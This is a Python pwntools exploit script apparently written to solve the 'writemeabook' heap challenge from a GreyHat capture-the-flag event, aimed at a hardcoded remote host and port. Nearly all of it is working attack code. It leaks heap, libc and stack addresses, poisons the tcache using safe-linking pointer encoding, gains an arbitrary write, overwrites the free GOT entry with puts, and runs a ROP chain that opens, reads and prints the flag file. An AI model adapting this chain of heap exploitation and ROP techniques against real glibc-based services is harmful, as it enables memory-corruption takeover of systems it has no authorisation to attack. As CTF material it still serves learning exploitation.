#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn

BINARY = "chall"
LIBC = "/home/dqp/greyhat_CTF/writemeabook/dist/lib/libc.so.6"
LD = "/home/dqp/greyhat_CTF/writemeabook/dist/lib/ld-linux-x86-64.so.2"

# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8  = pwn.p8
u8  = pwn.u8

host = '34.124.157.94'
port = 12346


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
source /home/nasm/Downloads/pwndbg/gdbinit.py
'''.format(**locals())

HEAP_OFFT = 0x3d10
CHUNK3_OFFT = 0x3d50
STDOUT = 0x21a780

def encode_ptr(heap, offt, value):
    return ((heap + offt) >> 12) ^ value

import subprocess
def one_gadget(filename):
  return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def exp():

    io = start()

    def init(flip):
        io.sendlineafter(b"> ", flip)
    
    def add(idx, data: bytes):
        io.sendlineafter(b"Option: ", b"1")
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.sendlineafter(b"Write me a book no more than 32 characters long!\n", data)

    def edit(idx, data):
        io.sendlineafter(b"Option: ", b"2")
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.sendlineafter(b"Write me the new contents of your book that is no longer than what it was before.\n", data)

    def free(idx):
        io.sendlineafter(b"Option: ", b"3")
        io.sendlineafter(b"Index: ", str(idx).encode())

    def heapLeak(idx):
        io.sendlineafter(b"Option: ", b"1337")
        io.sendlineafter(b"What is your favourite number? ", str(idx).encode())
        io.recvuntil(b"You found a secret message: ")
        return int(io.recvline().replace(b"\n", b"").decode(), 16) - HEAP_OFFT

    def enable_print(idx):
        edit(idx, b"".join([
            pwn.p64(0)
        ]))

    def libc_leak_free(idx):
        io.sendlineafter(b"Option: ", b"3")
        io.sendlineafter(b"Index: ", str(idx).encode())
        return pwn.unpack(io.recvline().replace(b"\n", b"").ljust(8, b"\x00")) - STDOUT

    def leak_environ(idx):
        io.sendlineafter(b"Option: ", b"3")
        io.sendlineafter(b"Index: ", str(idx).encode())
        return pwn.unpack(io.recvline().replace(b"\n", b"").ljust(8, b"\x00"))
    input()
    init(b"m"*4 + pwn.p8(0x41))

    add(1, b"K"*0x10)
    heap_leak = heapLeak(1)
    pwn.log.success(f"heap: {hex(heap_leak)}")

    # victim
    add(2, b"")
    add(3, b"".join([   b"A"*0x10,
                        pwn.p64(0), # prev_sz
                        pwn.p64(0x21) # fake size
                    ]))
    
    add(4, b"".join([   b"A"*0x10,
                        pwn.p64(0), # prev_sz
                        pwn.p64(0x21) # fake size
                    ]))
    free(4) # count for 0x40 tcachebin = 1

    # chunk2 => sz extended
    edit(1, b"K"*0x20)
    # chunk2 => tcachebin 0x40, count = 2
    free(2)

    # oob write over chunk3, we keep valid header
    add(2, b"".join([   pwn.p64(0)*3,
                        pwn.p64(0x41) # valid size to end up in the 0x40 tcache bin
                    ])) # count = 1

    
    free(3)

    pwn.log.info(f"Encrypted fp: {hex(encode_ptr(heap_leak, CHUNK3_OFFT, exe.got.printf))}")

    # tcache poisoning
    edit(2, b"".join([   pwn.p64(0)*3,
                         pwn.p64(0x41), # valid size
                         pwn.p64(encode_ptr(heap_leak, CHUNK3_OFFT, exe.sym.books)) # forward ptr
                     ]))

    # dumb
    add(3, b"A"*0x20) # count = 1

    # arbitrary write to @books, this way books[1] is user controlled
    add(4, b"".join([
        pwn.p64(0x1000), # sz
        pwn.p64(exe.sym.books), # target
        b"P"*0x10
    ])) # count = 0

    # we can write way more due to the previous call
    edit(1, pwn.flat([
            # 1==
            0xff, # sz
            exe.sym.stdout, # target
            # 2==
            0x8, # sz
            exe.got.free, # target
            # 3==
            0x8, # sz
            exe.sym.secret_msg, # target
            # 4==
            0xff, # sz
            exe.sym.books # target
        ] + [0] * 0x60, filler = b"\x00"))
    
    # free@got => puts
    edit(2, b"".join([
            pwn.p64(exe.sym.puts)
        ]))
    
    # can print = true
    enable_print(3)

    # libc leak
    libc.address = libc_leak_free(1)
    pwn.log.success(f"libc: {hex(libc.address)}")

    # leak stack (environ)
    edit(4, pwn.flat([
            # 1==
            0xff, # sz
            libc.sym.environ # target
        ], filler = b"\x00"))

    environ = leak_environ(1)
    pwn.log.success(f"environ: {hex(environ)}")

    stackframe_rewrite = environ - 0x150
    pwn.log.success(f"stackframe_rewrite: {hex(stackframe_rewrite)}")

    rop = pwn.ROP(libc, base=stackframe_rewrite)

    # setup the write to the rewrite stackframe
    edit(4, pwn.flat([
            # 1==
            0xff, # sz
            stackframe_rewrite # target
        ], filler = b"\x00"))

    # ROPchain
    rop(rax=pwn.constants.SYS_open, rdi=stackframe_rewrite + 0xde + 2, rsi=pwn.constants.O_RDONLY) # open
    rop.call(rop.find_gadget(["syscall", "ret"]))
    rop(rax=pwn.constants.SYS_read, rdi=3, rsi=heap_leak, rdx=0x100) # file descriptor bf ...
    rop.call(rop.find_gadget(["syscall", "ret"]))

    rop(rax=pwn.constants.SYS_write, rdi=1, rsi=heap_leak, rdx=0x100) # write
    rop.call(rop.find_gadget(["syscall", "ret"]))
    rop.exit(0x1337)
    rop.raw(b"./flag\x00")

    print(rop.dump())
    print(hex(len(rop.chain()) - 8))
    edit(1, rop.chain())
    
    io.interactive()

if __name__ == "__main__":
    exp()